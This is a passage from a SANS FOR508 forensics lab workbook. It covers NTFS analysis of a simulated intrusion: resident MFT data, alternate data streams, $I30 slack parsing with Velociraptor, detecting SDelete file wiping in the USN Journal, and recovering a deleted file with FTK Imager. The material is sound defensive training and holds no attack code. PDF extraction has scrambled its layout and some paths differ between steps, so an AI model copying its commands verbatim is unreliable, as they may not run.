Source file: G:\Labs\ntfs-anti-forensics\mftecmd-residentdata\Resident\338767-11_$I2T2A0E.csv.bin
Version: 2 (Windows 10/11)
File size: 501 (501B)
File name: C:\Windows\Update\rd04_history.csv
Deleted on: 2023-01-17 18:26:00

Processed 1 out of 1 files in 0.0229 seconds
G:\>

Looks like this is an attacker ﬁle from C:\Windows\Update . It was recycled on 2023-01-17. You can easily review the

.

corresponding CSV ﬁle by opening it with Timeline Explorer. Or since it's small, just type it out in a CMD window:
type G:\Labs\ntfs-anti-forensics\mftecmd-resident-data\Resident\337872-21_$R2T2A0E.csv.bin

Expected results

C:\Users\sansdfir>type G:\Labs\ntfs-anti-forensics\mftecmd-residentdata\Resident\337872-21_$R2T2A0E.csv.bin
URL,Title,Visit Time,Visit Count,Visited From,Visit Type,Visit Duration,Web
Browser,User Profile,Browser Profile,URL Length,Typed Count,History File,Record ID
https://app.slack.com/t/starkresearchlabs/login/zapp-1360938911687-4412054285011-0fc756f1c9b20279122c49f6287914c49693da0d12d9e5810786ea5fa
| Slack,11/22/2022 5:25:00 PM,1,,,,Edge (Chromium-based),nromanoff,Default,146,,\
\rd04.shieldbase.com\c$\Users\nromanoff\AppData\Local\Microsoft\Edge\User
Data\Default\History,123

Yet another indication of lateral movement!

© 2023 SANS Institute

.

235

Keep in mind that in this example, we did not recover a deleted ﬁle (although we did recover a recycled ﬁle). The two ﬁles we
analyzed were both allocated ﬁles in the $MFT. You could verify that in a few ways, including searching for the ﬁlenames in the
mft-rd01.csv ﬁle we generated earlier in the lab. Here's a search in Timeline Explorer for the common part of both ﬁlenames:

Even though we didn't extract truly deleted ﬁles, hopefully you still see the power of MFT analysis...even down to reviewing the ﬁle
data itself (in some cases)! There certainly are a number of ﬁles in the $MFT that are deleted and have resident ﬁle data in the
MFT. We just happened to ﬁnd an interesting one that was still allocated.
Besides picking out speciﬁc ﬁles of interest, either via keyword searches or ﬁle types, you could take the dumped data and do bulk
analysis against them with tools like antivirus clients and a YARA scanner. In fact, for extra credit, try the following YARA scan
using the combined rule set we used in the Optional Homework section of Lab 4.1.
yara64.exe -r -C C:\Forensic_Program_Files\yara\signature_base_yara.compiled G:\Labs\ntfs-antiforensics\mftecmd-resident-data\Resident

False-positive? Probably :)

Optional Prep - Mount the Full C-Drive Image with AIM
For the next two optional parts, we need access to the full C drive disk image from RD01. This process was covered in Lab 5.1

.

Preparation section for accessing the disk image ﬁle in the Linux SIFT VM. The process is roughly the same for the Windows VM.
1. To start, you will need the FOR508 ISO "B" ﬁle. The exact name of the ISO "B" ﬁle may change over time, so we will need to be
somewhat ﬂexible in how we describe it here. For the examples in this lab, the ISO "B" ﬁle that we will use is named
508.23.1B.iso . Your ISO "B" ﬁle may be named slightly differently, but it should end with a "B".

2. After locating your ISO "B" ﬁle, you will need to attach it to the Windows VM as a DVD drive. The conﬁguration for connecting
the ISO to the VM varies slightly depending on which VMware product is used (Workstation, Player, or Fusion). In all cases,
though, it will be speciﬁed via the guest Virtual Machine's Settings dialog box. Based on the VMware product you are using,
you can access a VM's CD/DVD conﬁguration Settings page as follows:
• VMware Workstation: Use the VM menu and choose Settings... > Hardware tab > CD/DVD
• VMware Player: Choose Player > Manage > Virtual Machine Settings... > Hardware tab > CD/DVD
• VMware Fusion: Choose Virtual Machine > CD/DVD > CD/DVD Settings...

Attention
Be sure to check the box to "Connect" the CD/DVD drive. It is easy to overlook, but it's required to access the data inside the
VM.

236

© 2023 SANS Institute

.

Example conﬁguring CD/DVD from VMware Workstation

In this case, the ISO ﬁle was located in the folder C:\508-Files and the ISO "B" ﬁle was named 508.23.1B.iso . Of course
you will need to browse to the location where you saved the ISO ﬁles that you downloaded from the SANS student portal.
• Reminder: Be sure to check the box to "Connect" the CD/DVD hardware to the guest.

3. Now inside the Windows VM, the ISO ﬁle should be auto-mounted within a few seconds and show up as a DVD on the

D:

drive, as shown below. To verify, click the D: drive and browse to SRL-Data\Disk-Images where you'll see the image ﬁle

.

rd01-c-drive.E01 .

4. With the disk image available, the next step is to mount it as a virtual drive in Windows. We will use perhaps the best free tool
for doing so, which is Arsenal Image Mounter (AIM). AIM has a number of useful licensed features, but the core features are
available for free without purchasing a license. AIM has a GUI tool for specifying the conﬁguration when mounting images,
but it can also be done via command-line. Let's use the CLI option here.
Use an Administrator CMD window to run the following:
aim_cli.exe /mount /filename=D:\SRL-Data\Disk-Images\rd01-c-drive.E01 /provider=libewf /readonly /background

It will likely mount the RD01 disk as the F: drive in the VM. Check the command output to verify. It may also launch the new
drive in Windows File Explorer.

© 2023 SANS Institute

.

237

Later, when ﬁnished with the lab, you can dismount it with the command aim_cli /dismount=000000 (or simply reboot).
Optional - Review Alternate Data Streams
Alternate Data Streams (ADS) can be used in multiple ways, both legitimately and illegitmately. In the ﬁrst part of the lab, we will
take a quick look at ﬁles with alternate data streams in the wacsvc Downloads directory. We'll then take a more holistic approach

.

by reviewing ADS information as reported by MFTECmd.
Make sure you have completed the Optional Prep section above.
1. In a CMD window, change directories as follows (if AIM mounted the disk image to a drive letter other than F , be sure to
change the drive letter in the command):
cd /d F:\Users\wacsvc\Downloads

2. Run dir ﬁrst to see a normal ﬁle listing:
dir

238

© 2023 SANS Institute

.

Expected results

G:\>cd /d F:\Users\wacsvc\Downloads
F:\Users\wacsvc\Downloads>dir
Volume in drive F is Windows 11
Volume Serial Number is 20C0-DDB3
Directory of F:\Users\wacsvc\Downloads
01/23/2023
01/23/2023
01/17/2023
01/23/2023
01/23/2023

08:54 PM
<DIR>
08:54 PM
<DIR>
06:08 PM
1,344 bhv.cfg
08:54 PM
1,719,840 ph.exe
08:54 PM
1,078,672 px.exe
3 File(s)
2,799,856 bytes
2 Dir(s) 28,699,500,544 bytes free

F:\Users\wacsvc\Downloads>

3. Now we'll use the /r command-line option of dir to view a directory listing including alternate "$DATA" streams. Notice the
difference highlighted below.
dir /r

.

Expected results
F:\Users\wacsvc\Downloads>dir /r
Volume in drive F is Windows 11
Volume Serial Number is 20C0-DDB3
Directory of F:\Users\wacsvc\Downloads
01/23/2023
01/23/2023
01/17/2023
01/23/2023
01/23/2023

08:54 PM
08:54 PM
06:08 PM
08:54 PM

<DIR>
<DIR>

1,344 bhv.cfg
1,719,840 ph.exe
81 ph.exe:Zone.Identifier:$DATA
08:54 PM
1,078,672 px.exe
81 px.exe:Zone.Identifier:$DATA
3 File(s)
2,799,856 bytes
2 Dir(s) 28,699,500,544 bytes free

F:\Users\wacsvc\Downloads>

© 2023 SANS Institute

.

239

4. There are several ways to review the contents of the ADS. One option in the CMD window is to read it into the more command.
For example:
more < ph.exe:Zone.Identifier

In this case, we're accessing the ADS of ph.exe by using the syntax <filename>:<adsname>

Expected results

F:\Users\wacsvc\Downloads>more < ph.exe:Zone.Identifier
[ZoneTransfer]
ZoneId=3
HostUrl=https://secure.csharefile.com/download/ph.exe

Other ADS viewing options
PowerShell's Get-Content has built-in capability to access alternate data streams with the stream parameter. For
example, run the following in a PowerShell Window (or preface it with powershell in your CMD window):
get-content F:\Users\wacsvc\Downloads\ph.exe -stream Zone.Identifier

Another simple option is to open it Notepad:

.

notepad F:\Users\wacsvc\Downloads\ph.exe:Zone.Identifier

With regard to the contents, we see an example of a typical "mark of the web". This is the feature that Microsoft implemented to
generally tag the source of a ﬁle that was downloaded using the Windows API (speciﬁcally, the function IAttachmentExecute ).
Applications that use the standard Windows API function to download ﬁles will mark those ﬁles with a "ZoneID". ZoneID 3 is the
Internet. More recent versions of the API added source URL information to note where the ﬁle was downloaded from. Just seeing
that a ﬁle of interest has a Zone.Identiﬁer ADS is very useful. Add to that that we may get the source URL included in the contents
of the ADS...well that's pretty nice!

240

© 2023 SANS Institute

.

Next, let's use the output from MFTECmd created earlier in this lab (during Timestomping Identiﬁcation) to review all the
Zone.Identiﬁer data in a single pass.
1. If you don't have mft-rd01.csv open in Timeline Explorer, you can open a precooked version from

G:\Precooked\ntfs-anti-

forensics . Once you have it open, be sure to clear any current ﬁlters by pressing CTRL-E. Then scroll to the right and ﬁnd the

"Zone Id Contents" column (it's near the end). Hover over the top-right corner of that column and then click on the ﬁlter
button. Check the box for "(All)" and then uncheck the box for "(Blanks)".

2. This is a great shortcut for accessing the Zone.Identiﬁer data. After applying the ﬁlter, there should be 69 entries with ZoneID
data. Scroll through them and see if any stick out. Do you see any that are suspicious? (Hint: if you see a keyword of interest,
add a column ﬁlter to see if there are others with that keyword.)

.

________________________________________________________________

© 2023 SANS Institute

.

241

Solution
• Yes, notice the references to ph.exe and px.exe coming from the "cshareﬁle" URL:

• We discovered this URL earlier by reviewing browser downloads in the super timeline. It makes sense to pay special
attention to speciﬁc directories such as this, but using MFTECmd's ability to parse out the Zone.Identiﬁer data across
all ﬁles at once is a very nice feature and worth reviewing too. You can see how it could prove useful for searching for
indicators, such as URLs to attacker infrastructure.
Optional - Use Velociraptor to Parse $I30
Velociraptor is truly a Swiss army knife of features and functionality. Among those features is the ability to use its forensic
parsing capabilities in a standalone/oﬄine mode. In this short discussion, we'll look at how you could use many of Velociraptor's
parsing artifacts against a mounted disk image. Of course, keep in mind that all of these capabilities can also be done at scale
when run in client-server mode.

.

Using Velociraptor on the Command-Line

The primary workﬂow for Velociraptor is based on using the web-UI for running and analyzing Velociraptor queries. However, most
of what can be done via the UI can also be done at the command-line. Let's use parsing $I30 data as an example. It turns out to
be a quite useful example too, because Velociraptor has the ability to recurse through directories to parse $I30 data down the
entire hierarchy. That is a feature not available with other tools largely designed to parse individual $I30 ﬁles. This capability does
require access to the entire volume, so make sure you have completed the Optional Prep section above. These instructions
assume the disk image is mounted to F: .
1. We will begin with a basic collection of $I30 data for the attacker's Update directory using the mounted image ( F: drive in
this example). The artifact we will use is Windows.NTFS.I30 . It is generally easier to locate and review artifacts in the GUI
(which we will cover next), but it is also possible to do so on the command-line. We will use the
velociraptor artifacts show command. For example:

velociraptor.exe artifacts show Windows.NTFS.I30

242

© 2023 SANS Institute

.

Expected results

G:\>velociraptor artifacts show Windows.NTFS.I30
name: Windows.NTFS.I30
description: |
Carve the $I30 index stream for a directory.
This can reveal previously deleted files. Optionally upload the I30
stream to the server as well.
parameters:

- name: DirectoryGlobs
default: C:\Users\*
- name: SlackOnly
description: "Select to return only entries from Slack space."
type: bool
- name: AlsoUpload
description: Select to also upload the raw $I30 stream.
type: bool
sources
- name: UploadI30Streams
precondition:
SELECT * FROM info() where OS = 'windows' AND AlsoUpload
query: |
LET inodes = SELECT FullPath, Data.mft AS MFT,
parse_ntfs(device=FullPath, inode=Data.mft) AS MFTInfo
FROM glob(globs=DirectoryGlobs, accessor="ntfs")
WHERE IsDir

.

LET upload_streams = SELECT * FROM foreach(
row=MFTInfo.Attributes,
query={
<truncated>

2. Now let's go ahead and collect by changing the command to velociraptor artifacts collect . We will take advantage of
the two parameters highlighted above: DirectoryGlobs and SlackOnly . When parsing $I30 index data, we generally only
care about the slack entries because the allocated entries are more easily (and thoroughly) reviewed by parsing the $MFT.
Note that for the DirectoryGlobs parameter example shown above, the path slashes used were backslashes. On the
command-line, it seems that forward slashes are required.
Run the command to parse the $I30 slack entries for the Windows\Update directory on the RD01 image:
velociraptor.exe artifacts collect Windows.NTFS.I30 --args DirectoryGlobs="F:/Windows/Update/" --args
SlackOnly=Y --format=csv --nobanner > G:\Labs\ntfs-anti-forensics\I30-windows-update.csv

© 2023 SANS Institute

.

243

Expected results

G:\>velociraptor.exe artifacts collect Windows.NTFS.I30 --args DirectoryGlobs="F:/Windows/Update/" -args SlackOnly=Y --format=csv --nobanner > G:\Labs\ntfs-anti-forensics\I30-windows-update.csv
G:\>

Nothing is returned from running the command, but if you check the output directory, you should see the resulting CSV. In

hi

de

01

.ir

this case, it should be a 5 KB ﬁle. Open it with Timeline Explorer to review the results (it should have 25 entries).

3. Next, let's take advantage of Velociraptor's ability to traverse a directory structure to parse $I30 data along the entire path.
This could be done from the root of the drive, but keep in mind it will generate a lot of data. Alternatively, you could be a little
more targeted, such as traversing a user's proﬁle directory structure. We will use that as an example here, pulling $I30 slack
data from the wacsvc user account proﬁle. To do so, we change the DirectoryGlobs parameter to point to the top-level
directory we are interested in and add /** to parse all data recursively. For example:
velociraptor.exe artifacts collect Windows.NTFS.I30 --args DirectoryGlobs="F:/Users/wacsvc/**" --args
SlackOnly=Y --format=csv --nobanner > G:\Labs\ntfs-anti-forensics\I30-wacsvc-profile.csv

244

© 2023 SANS Institute

.

Expected results
Nothing is returned from running the command, but if you check the output directory, you should see the resulting CSV. In
this case, it should be a 1,920 KB ﬁle. Open it with Timeline Explorer to review the results (it should have 6,831 entries).

.

Parsing with Velociraptor on the command-line is a powerful capability. This is particularly useful for forensic analysis of deadbox images. The Velociraptor team has put some emphasis on this functionality. For example, have a look at their article "Dead
Disk Forensics" at https://docs.velociraptor.app/blog/2022/2022-03-22-deaddisk/.
Using Velociraptor's Standalone GUI Mode

In this section, we just quickly want to show you how you can run Velociraptor's GUI in a standalone mode to perform similar
analysis on the localhost (including for mounted images). To do so, you simply run velociraptor.exe gui . Once launched (in an
Admin shell), it will start a temporary local server and run the client as well. You then interact with the server via the web UI and run
commands against your localhost as a client. Let's run through the process.
1. Launch a new Administrator CMD window in the 508 Windows VM. Then run the following command:
velociraptor.exe gui

You should see a lot of text scroll by as Velociraptor starts up both a local server and local client instance.

© 2023 SANS Institute

.

245

Note
When Velociraptor is started in gui mode, it writes its conﬁg information and data storage into the user's
AppData\Local\Temp directory. For example, you can list the yaml-based conﬁgs for this instance with the following

command:
C:\Users\sansdfir\AppData\Local\Temp>dir *.yaml

The Velociraptor data will stay in place, so if you stop Velociraptor (CTRL-C) or reboot, you can re-run velociraptor.exe

.

gui later to pick up where you left off.

2. Velociraptor will likely start up the browser automatically, but if not, browse to https://localhost:8889. You will then be
prompted to accept the self-sign server certiﬁcate. Choose Advanced and then Continue to 127.0.0.1 (unsafe):

246

© 2023 SANS Institute

.

.
© 2023 SANS Institute

.

247

3. You should now be on the Velociraptor server's home page. Click on the "Magnifying Glass" button toward the top.

Client ID will likely be different).

248

.

4. This will take you to the list of clients. There should be just one, for "SANS-SIFT". Click on the Client ID for SANS-SIFT (your

© 2023 SANS Institute

.

5. You are brought to the main page of this particular client. Click on the "Collected" button toward the top. This takes you to the
queries that have been performed on this client.
Generic.client.Info

Initially, there should only be the

ﬂow available.

Note
A "ﬂow" is a combination of a query sent to a client and the results it returned. The

Generic.client.Info ﬂow is run by

default when a new client joins a server.

.

6. Click on the "Plus" ( + ) button toward the top-left. This initiates the wizard to run a new collection query.

7. On the collection query Select Artifacts page, search for "I30" and select Windows.NTFS.I30 . Then select the Conﬁgure
Parameters button.

© 2023 SANS Institute

.

249

8. On the Conﬁgure Parameters page, click the "Wrench" button to change the default parameters.

.

F:\Users\wacsvc\**

Then change "DirectoryGlobs" to

and check the box for "SlackOnly". This assumes the RDO1 disk is

mounted to F: . Note that using the double-asterisks ** instructs Velociraptor to parse recursively. You can skip the "Specify
Resources" and "Review" pages and go straight to Launch.

250

© 2023 SANS Institute

.

9. You'll then be taken back to the Collected Artifacts page. At the top of the list will be the new query. It will likely take 5-10

.

seconds to complete. When you get the check-mark under the "State" column, select it and then view the results.

© 2023 SANS Institute

.

251

You could review the results in the Results tab or the Notebook tab in Velociraptor. Or from either tab, you could use the
"Export to CSV button" to review in an external viewer. If you'd like to export, the best option is through the Results tab
because by default, the Notebook will limit the results to the ﬁrst 50. The Results tab doesn't include a default limit.
Here's a look at reviewing the results in Timeline Explorer after exporting from the Results tab. Note that you should get the

.

same number of entries as when we parsed it via the command-line in the previous section (i.e., 6,831 slack entries).

Hopefully this was useful to see how the Velociraptor UI can be used in standalone mode for analysis (and for practice). We used
a simple example here. Remember to check out Velociraptor's article "Dead Disk Forensics" at https://docs.velociraptor.app/blog/
2022/2022-03-22-deaddisk/ to learn how to take the approach further.
Optional - Extract Individual $I30 Files with FTK Imager
There are a number of ways to extract the $I30 index for speciﬁc directory. However, those ways do require access to the live ﬁle
system or typically to a full disk image. In both cases, you could use free forensics tools such as FTK Imager or The Sleuth Kit.
We'll run through a quick example with FTK Imager.
1. Open FTK Imager from the "Acquisition Tools" fence on the desktop:

252

© 2023 SANS Institute

.

2. Click "File" menu and choose "Add Evidence Item..."

.

3. Pick "Image File" (but note that we also have the option to add a live physical or logical drive attached to the host):

4. Now browse to and select the image ﬁle D:\SRL-Data\Disk-Images\rd01-c-drive.E01 . Then click "Finish".

© 2023 SANS Institute

.

253

5. At this point, you should be able to browse to any directory within the image and then in a directory of interest, right-click on
the $I30 in the directory, and choose "Export Files..." to save it. For example, here is what it would look like to get the $I30 from

.

wacsvc's Downloads directory:

6. FTK Imager will export the ﬁle with the same name. Be sure to change it to something meaningful so you'll remember which
directory it was associated with. For example, I30-wacsvc-downloads in this case.

254

© 2023 SANS Institute

.

You're now ready to analyze the ﬁle with forensics tools such as MFTECmd or Indx2CSV, as we discussed in the Review $I30
for Directories of Interest part of the lab.

Lab Takeaways
• We used MFTECmd to extract the USN Journal data and pivoted on ﬁles of interest to see how they may have changed,
including ﬁle renames and moves. Speciﬁcally, we located 2 relatively short-lived ﬁles in C:\Windows\Update : d.reg and
d.vbs . We also pivoted on parent directories of interest to see what ﬁles and folders may have been in the directory according

to the USN Journal.
• We used a number of analysis techniques to detect possible timestomping by the attacker. We found several of our checks did
indicate backdating of the attacker's malware STUN.exe .
• We parsed the $I30 index slack entries to ﬁnd prior records of ﬁles in parent directories, speciﬁcally analyzing ﬁles in the

C:

\Windows directory. We identiﬁed signs of ﬁle wiping, which we will follow-up on in the next lab.

• In optional sections, we looked at recovering MFT resident ﬁle data, the use of alternate data streams, and using Velociraptor
to recursively extract $I30 slack entries from a disk image. This same technique could be used at scale against remote

.

Velociraptor clients.

© 2023 SANS Institute

.

255

Lab 5.4: Anti-Forensics Analysis and Data Recovery
Objectives
• Locate wiped ﬁles and determine their original ﬁle names and locations
• Recover a deleted ﬁle of interest using the metadata method
• Optional Homework: Carve for NTFS records

Lab Preparation
This lab is completed in your 508 Windows VM
Launch the 508 Windows VM and log in.
• LOGIN = SANSDFIR
• PASSWORD = forensics

Review Signs of File Wiping
At different points in our investigation we have seen some evidence of a ﬁle wiper being used by the attacker. In the Lab 5.3, we
spotted a common marker for Microsoft's Sysinternals SDelete wiping metadata. As a reminder, we noticed this pattern in the

.

$I30 slack entries of the C:\Windows directory index:

Let's see if we can hone in on that a little more and perhaps discover the original ﬁle that was wiped. We will use the USN Journal
for this. If you don't have it open already, use Timeline Explorer to open usnjrnl-rd01.csv from

G:\Precooked\ntfs-anti-

forensics .

Notice from the screenshot above that the 2 nd LLLLLL~1.LLL has an MFT Record number associated with it. Let's search for that
value 339441 in the "Entry Number" of the USN Journal data.

256

© 2023 SANS Institute

.

Review the results of the ﬁlter.
1. Can you determine the original ﬁlename before it was wiped?
________________________________________________________________
Solution
The original ﬁlename was wac01.shieldbase.com.txt

the ﬁle to overwrite the original name?

DataOverwrite to FileDelete )? And how many times did it rename

.

2. Approximately how long did it take wipe the ﬁle (from

________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

257

Solution
• It took about 63 milliseconds to wipe the ﬁle ( 18:46:02.1662195 - 18:46:02.1036510 )
• Based on the USN Journal, we can see it renamed the ﬁle 26 times. Each time it changed all characters in the ﬁlename
to a successive letter in the English alphabet, starting with A and ending with Z .
• This is the design of Sysinternals' SDelete tool. You can read about its process on their site at https://
for508.com/a10bu.

3. Can you ﬁnd other ﬁles wiped by SDelete in the USN Journal? If so, how many in total were there?
________________________________________________________________
________________________________________________________________

.

Hint

SDelete uses a very standard method of deleting the ﬁle and the ﬁle's metadata. What could you search for as the very
ﬁnal step in the SDelete process?

258

© 2023 SANS Institute

.

Solution
• 10 ﬁles were wiped by SDelete
• Since SDelete renames every ﬁle 26 times, ending on the letter Z, then we can search for a pattern such as ZZZ . That
search alone results in 30 hits:

• Furthermore, this is the last rename that occurs before deleting the ﬁle. So we can add a ﬁlter that "UpdateReason"

.

must contain the FileDelete action. This gets rid of some of the duplicates and now we're down to 10 unique ﬁles

We have found a variety of ways to detect the presence of a ﬁle wiper during our analysis. It was encountered with "Evidence of
Execution" artifacts (via AmCache/AppCompatProcessor), log analysis (via Defender logs), super timeline analysis (via the
AcceptEula registry key), and ﬁnally through metadata wiping discovered in $I30 and USN Journal records. So wiping might be
successful in permanently deleting the data, but it's certainly not a stealthy technique! With regard to data recovery, there are still
possibilities there. Leveraging volume shadow copies would be the simplest. File carving would be another possibility if the wiped
ﬁles had been in other locations on the disk (perhaps in the pageﬁle, or temporary copies created from ﬁle editing, for example).
Of course the artifacts we discovered in our case were related to Microsoft's Sysinternals SDelete tool, which is commonly used
by attackers since it is signed by Microsoft. However, there are of course other wipers out there, but each tends to have their own
tool markings that can be detected. For example, the popular wiper BC Wipe creates a new directory named

~BCWipe.tmp in the

root of the volume, as does the built-in tool cipher.exe (it creates EFSTMPWP , which sounds temporary, but in testing the directory
did not get deleted). So the takeaway is, keep your eyes open for some of the tell-tale signs of wipers and then start pulling the
thread!

© 2023 SANS Institute

.

259

Recover Deleted Files with FTK Imager
FTK Imager is a free tool from Exterro, the company that produces the larger FTK commercial forensics suite. Although it's the
free "kid brother" of FTK, FTK Imager is a very capable tool in its own right. Here are several features worth highlighting:
• Convert forensic images (for example, from raw "dd" to a compressed "E01")
• Create disk images from connected drives
• Preview and extract ﬁles from connected drives, even if the ﬁles are locked
• Preview the contents of forensic images (supports multiple ﬁle systems, including NTFS, APFS, EXT4, and more)
• Export ﬁles and folders from forensic images.
• Review and recover ﬁles that have been deleted (metadata method)
In this quick exercise, we'll add the C-drive disk image of RD01 and locate a deleted ﬁle of potential interest for extraction. We'll
then do a bit of analysis on the ﬁle to see if we can determine its origin.
1. To start, we ﬁrst need to access the rd01-c-drive.E01 disk image from ISO "B". The exact name of the ISO "B" ﬁle may
change over time, so we will need to be somewhat ﬂexible in how we describe it here. For the examples in this lab, the ISO "B"
ﬁle that we will use is named 508.23.1B.iso . Your ISO "B" ﬁle may be named slightly differently, but it should end with a "B".
2. After locating your ISO "B" ﬁle, you will need to attach it to the Windows VM as a DVD drive. The conﬁguration for connecting
the ISO to the VM varies slightly depending on which VMware product is used (Workstation, Player, or Fusion). In all cases,
though, it will be speciﬁed via the guest Virtual Machine's Settings dialog box. Based on the VMware product you are using,
you can access a VM's CD/DVD conﬁguration Settings page as follows:
• VMware Workstation: Use the VM menu and choose Settings... > Hardware tab > CD/DVD
• VMware Player: Choose Player > Manage > Virtual Machine Settings... > Hardware tab > CD/DVD

.

• VMware Fusion: Choose Virtual Machine > CD/DVD > CD/DVD Settings...

Attention
Be sure to check the box to "Connect" the CD/DVD drive. It is easy to overlook, but it's required to access the data inside the
VM.

260

© 2023 SANS Institute

.

Example conﬁguring CD/DVD from VMware Workstation

In this case, the ISO ﬁle was located in the folder C:\508-Files and the ISO "B" ﬁle was named 508.23.1B.iso . Of course
you will need to browse to the location where you saved the ISO ﬁles that you downloaded from the SANS student portal.
• Reminder: Be sure to check the box to "Connect" the CD/DVD hardware to the guest.

3. Now inside the Windows VM, the ISO ﬁle should be auto-mounted within a few seconds and show up as a DVD on the

D:

drive, as shown below. To verify, click the D: drive and browse to SRL-Data\Disk-Images where you'll see the image ﬁle

.

rd01-c-drive.E01 .

4. With the disk image available, the next step is to load it into FTK Imager in preview mode. Open FTK Imager from the
"Acquisition Tools" fence on the desktop:

5. Click "File" menu and choose "Add Evidence Item..."

© 2023 SANS Institute

.

261

6. Pick "Image File" (but note that we also have the option to add a live physical or logical drive attached to the host):

.

7. Now browse to and select the image ﬁle D:\SRL-Data\Disk-Images\rd01-c-drive.E01 . Then click "Finish".

8. At this point, you should be able to browse to any directory within the image to review ﬁles and get a text-based or hex-based
preview of their contents. It's even possible with some deleted data.
During our analysis, we've uncovered evidence of quite a few ﬁles deleted by the attacker. In fact, quite a few ﬁles wiped by the
attacker. Once a ﬁle is wiped, we won't be able to recover it via the metadata method. However, there are many ﬁles deleted
through normal means that could be of interest (and could be recoverable).

262

© 2023 SANS Institute

.

Summary of the Metadata Method
To recap the "metadata method", it's simply leveraging the fact that when ﬁles are deleted in NTFS (not wiped, just a
standard delete), the data on the disk remains intact, as well as the metadata in the MFT entry. The only thing that
changes is that the MFT entry is marked unused, as are the clusters used by the ﬁle. If we can get to the system quickly
enough, we could take advantage of the fact that this data remains intact and extract it using forensic methods--i.e., the
metadata method.

One directory that is typically worth reviewing on Windows systems, especially for intrusion cases, is the AppData\Local\Temp
directory of pertinent user accounts. Let's have a look at this location for the wacscv account. Under the "Evidence Tree" pane
to the left, expand and select the user's Temp directory. The complete path is:

.

• rd01-c-drive.E01 > Windows 11 [NTFS] > [root] > Users > wacsvc > AppData > Local > Temp

9. Scroll down through the ﬁles and folders in this directory. Do you see any deleted ﬁles listed? If so, how many?
Note that deleted ﬁles are marked with red X over their icon.
________________________________________________________________

© 2023 SANS Institute

.

263

Solution
• Yes, there are deleted ﬁles.
• How many ﬁles? That's a bit of a trick question...
• There's only 1 recoverable ﬁle. It's the ﬁle named 4f62567a-57d4-48d8-96b8-90a74e13b719.tmp :

• The others with the red X are $I30 slack entries that are highlighted by FTK Imager. They are not recoverable because
they are not MFT entries. $I30 entries do not include the location of the $DATA stream, so they can't be used to recover
data. However, it's still nice that FTK Imager recognizes slack entries in the directory index and provides them to

.

review.

10. For the deleted ﬁle named 4f62567a-57d4-48d8-96b8-90a74e13b719.tmp , do we know when it was deleted?
________________________________________________________________

264

© 2023 SANS Institute

.

Note
To see all the timestamps of a ﬁle in FTK Imager, select the ﬁle and then select the "Properties" tab in the very lower-left of
the window. You'll have to scroll a bit to see all 4 "MACB" timestamps. The $FILE_NAME timestamps are also provided

.

lower in the list.

© 2023 SANS Institute

.

265

Solution
• This is another trick question! No, we don't know when the ﬁle was deleted. Windows does not change any of the ﬁle's
timestamps when a ﬁle gets deleted. If a ﬁle is recycled, then the Recycle Bin tracks the deletion time in a

$I

metadata ﬁle. But that's for a soft delete. For a standard delete, which skips the Recycle Bin, the only way to know
when it was deleted is to ﬁnd the entry in the ﬁle system journals. Both the USN Journal and $LogFile journal would
have that recorded, but only for a short time in most cases.
• For reference, here's the ﬁle deletion event in the USN Journal:

• It's also worth noting what the ﬁle looks like in the ﬁle system timeline. Below is an example from the timeline in
bodyﬁle format. Whether we look at it in bodyﬁle format, or the more robust CSV output from MFTECmd, the key point
is to see that it's a ﬁle ﬂagged as "(deleted)". The MFT has this entry marked as unallocated and therefore "deleted",
but the residual metadata in it from the previous ﬁle helps us recover the data. Yet, you can see that none of the
timestamps correspond to when the ﬁle was deleted.

11. For the deleted ﬁle named 4f62567a-57d4-48d8-96b8-90a74e13b719.tmp , can you tell what type of ﬁle it is? Although it does

.

have a .tmp extension, reviewing the contents of the ﬁle may indicate its true ﬁle type.
________________________________________________________________

266

© 2023 SANS Institute

.

Solution
• It's a Windows executable.
• The well-known MZ header is part of the "magic number" for Windows Portable Executable (PE) ﬁles.
• Another clear indicator is the string "This program cannot be run in DOS mode" within the PE header.

12. Let's extract this ﬁle and see if we can determine its original name and/or functionality. Right-click on the ﬁle and choose

.

Export Files..., then save the ﬁle to the G:\Labs\ntfs-anti-forensics directory.

13. Open a PowerShell window and hash the ﬁle with the following command:
Get-FileHash G:\Labs\ntfs-anti-forensics\4f62567a 57d4 48d8 96b8 90a74e13b719 tmp
list

format-

Expected results

PS G:\> Get-FileHash G:\Labs\ntfs-anti-forensics\4f62567a 57d4 48d8 96b8 90a74e13b719 tmp
format-list
Algorithm : SHA256
Hash
: 3099FEA58717AE9608D9C01CF1A17658B2E3119730E72CF015C90999B6B47751
Path
: G:\Labs\ntfs-anti-forensics\4f62567a-57d4-48d8-96b8-90a74e13b719.tmp

© 2023 SANS Institute

.

267

14. Search the ﬁle hash in VirusTotal: https://www.virustotal.com/gui/home/search. Does VirusTotal recognize the ﬁle? If so,
does it appear to be malicious or benign? What functionality does it appear to have?
________________________________________________________________
________________________________________________________________

.

________________________________________________________________

268

© 2023 SANS Institute

.

Solution
• VirusTotal does recognize it.
• It doesn't appear to be malicious. 0 out of 70 AV engines that reviewed it at the time of this writing ﬂagged it as
malicious or suspicious.

Installer.

.

• Furthermore, reviewing the "Details" tab shows it is in fact a signed executable from Microsoft, used as an Edge

© 2023 SANS Institute

.

269

• No malware in this case, but it was worth validating the disposition of an executable in the attacker's Temp directory.

.

This exercise walked through an example process for extracting a deleted ﬁle from a disk image. The same can be done on live
systems with FTK Imager, as well as forensics tools like Velociraptor. It's a powerful capability, and one that can come in handy in
many cases.

Optional Homework - Records Carving
Carving for records rather than whole ﬁles has gained a lot of traction over the years and is applicable to many case types. For
just about any case, it's often useful to have a longer history of changes to the ﬁle system and Windows event logs. A great tool
that makes it easy and fast to recovery these records is Bulk Extractor with Record Carving. With a single run of the tool, we can
carve for records from the $MFT, $I30 directory indexes, USN Journal, $LogFile, Windows event logs, and even utmp login
information from Unix/Linux systems. Besides it being easy to run, it's also fast!

270

© 2023 SANS Institute

.

A note about what data to carve
In some cases, it may make sense to carve records against the entire image. Of course, if you've already performed analysis of
the allocated records for these artifact types, then that can be somewhat redundant. On the other hand, keep in mind that for
active volume shadow copies, the VSC data is stored in allocated ﬁles in the System Volume Information directory. If you
have not extracted that VSC data yet, then records carving on these allocated ﬁles can be another option rather than
mounting and extracting the artifacts from the shadow copies. So, depending on your analysis process, there are reasons you
might want to carve against the whole image, or at least carve the allocated VSC ﬁles in addition to unallocated space. In this
lab, we are going to focus only on the unallocated parts of the drive so we can see exactly what's in the "deleted space" of the Cdrive.

1. The ﬁrst step we'll take is to extract out the unallocated clusters from the RD01 C-drive image. The Sleuth Kit's blkls makes
